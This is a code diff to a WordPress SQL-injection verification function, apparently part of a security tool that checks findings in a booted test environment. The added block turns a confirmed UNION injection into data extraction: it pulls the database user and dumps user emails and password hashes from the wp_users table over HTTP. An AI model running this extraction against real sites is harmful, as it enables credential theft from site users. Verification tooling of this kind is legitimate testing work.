@@ -8267,6 +8267,44 @@ def verify_wordpress_sqli(
                 caption_en=(f"Step 5b: MySQL VERSION EXTRACTED (UNION) — {mysql_version} "
                             f"leaked in HTTP response. Exploitation confirmed."),
                 url=boot.base_url + endpoint)
+            # Post-UNION data extraction: reuse the confirmed column count/position
+            # to dump user(), @@hostname, and wp_users hashes via HTTP (not docker exec).
+            try:
+                _n_cols = payload_val.count(",") + 1  # rough column count from payload
+                _pos = 0
+                # find which position has version()
+                for _ci, _col in enumerate(payload_val.split("UNION SELECT ", 1)[-1]
+                                           .split("--")[0].split("-")[0].split(",") if "UNION SELECT" in payload_val else []):
+                    if "version()" in _col.lower():
+                        _pos = _ci
+                        break
+
+                def _union_extract(expr: str) -> str:
+                    _cols2 = ["NULL"] * _n_cols
+                    _cols2[_pos] = expr
+                    _p2 = f"{orig_value}{payload_val.split('UNION SELECT')[0].split(orig_value)[-1]} UNION SELECT {','.join(_cols2)}-- -"
+                    try:
+                        _r2 = send(_p2)
+                        return (_r2.text or "")[:500]
+                    except Exception:
+                        return ""
+
+                _user_body = _union_extract("user()")
+                if "@" in _user_body or "root" in _user_body.lower():
+                    _m_user = re.search(r"[a-z_]+@[a-z%_]+", _user_body, re.I)
+                    if _m_user:
+                        res.evidence["db_user"] = _m_user.group(0)
+                        step(f"  union-extra: DB user = {res.evidence['db_user']!r}")
+
+                _hashes_body = _union_extract(
+                    "group_concat(user_email,0x3a,user_pass separator 0x0a) "
+                    "FROM wp_users-- ")
+                if "$P$" in _hashes_body or "$1$" in _hashes_body:
+                    res.evidence["wp_users_hashes"] = _hashes_body[:300]
+                    step("  union-extra: wp_users hashes filtrados via HTTP UNION")
+            except Exception:
+                pass
+
             res.evidence["screenshots"] = boot.shots
             res.evidence["http_captures"] = boot.http_captures
             return res
